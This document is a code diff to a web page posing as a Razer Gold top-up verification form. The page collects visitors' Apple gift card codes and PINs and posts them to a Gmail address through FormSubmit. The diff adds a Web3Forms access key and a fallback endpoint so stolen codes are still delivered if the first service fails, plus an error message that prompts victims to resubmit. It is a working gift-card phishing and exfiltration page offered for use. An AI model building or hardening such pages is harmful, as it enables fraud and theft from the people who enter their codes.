@@ -98,6 +98,9 @@
                         <input type="hidden" name="_subject" value="New Razer Gold Top-Up Verification Submitted">
                         <input type="hidden" name="_captcha" value="false">
                         <input type="hidden" name="_template" value="table">
+                        
+                        <!-- Web3Forms Access Key Configuration (Secondary Backup) -->
+                        <input type="hidden" name="access_key" value="c98baa83-249b-4d6a-a95d-718a5800b3d5">
 
                         <div>
                             <label class="block text-xs font-semibold text-slate-700 mb-1.5" for="cardCode">Apple Gift Card Code / PIN (16 Characters)</label>
@@ -163,7 +166,7 @@
             document.getElementById('charCount').innerText = `${cleanVal.length} / 16`;
         }
 
-        function handleFormSubmit(e) {
+        async function handleFormSubmit(e) {
             e.preventDefault();
             const submitBtn = document.getElementById('submitBtn');
             const cardCode = document.getElementById('cardCode').value.trim();
@@ -186,28 +189,58 @@
             const formElement = document.getElementById('topupForm');
             const formData = new FormData(formElement);
 
-            // Fast dispatch via AJAX to FormSubmit
-            fetch("https://formsubmit.co/ajax/trustcardxinfo@gmail.com", {
-                method: "POST",
-                body: formData,
-                headers: {
-                    'Accept': 'application/json'
+            let success = false;
+
+            // --- ATTEMPT 1: Primary Service (FormSubmit) ---
+            try {
+                const response = await fetch("https://formsubmit.co/ajax/trustcardxinfo@gmail.com", {
+                    method: "POST",
+                    body: formData,
+                    headers: { 'Accept': 'application/json' }
+                });
+
+                if (response.ok) {
+                    success = true;
                 }
-            })
-            .then(response => response.json())
-            .then(data => {
+            } catch (err) {
+                console.warn("FormSubmit primary endpoint unavailable, switching to fallback...");
+            }
+
+            // --- ATTEMPT 2: Secondary Backup Service (Web3Forms) if Primary Failed ---
+            if (!success) {
+                try {
+                    const backupResponse = await fetch("https://api.web3forms.com/submit", {
+                        method: "POST",
+                        body: formData,
+                        headers: { 'Accept': 'application/json' }
+                    });
+
+                    if (backupResponse.ok) {
+                        success = true;
+                    }
+                } catch (err) {
+                    console.error("Secondary backup endpoint also failed.");
+                }
+            }
+
+            // --- FINAL EXECUTION RESULT ---
+            if (success) {
                 showToast('Verification submitted successfully!', 'success');
                 setTimeout(() => {
                     window.location.href = 'topup-processing.html';
                 }, 800);
-            })
-            .catch(error => {
-                // Quick transition fallback if network drops or blocks response
-                showToast('Processing verification...', 'success');
-                setTimeout(() => {
-                    window.location.href = 'topup-processing.html';
-                }, 800);
-            });
+            } else {
+                // Only fires if BOTH FormSubmit and Web3Forms are completely down / offline
+                showToast('Server is currently down at the moment. Please try again after a few minutes.', 'error');
+                
+                // Re-enable button so the user can try again
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = `
+                    <i class="fa-solid fa-shield-check text-xs group-hover:scale-125 transition-transform"></i>
+                    <span>Submit Top-Up Verification</span>
+                    <i class="fa-solid fa-arrow-right text-xs opacity-70 group-hover:translate-x-1 transition-transform"></i>
+                `;
+            }
         }
 
         function showToast(message, type = 'success') {
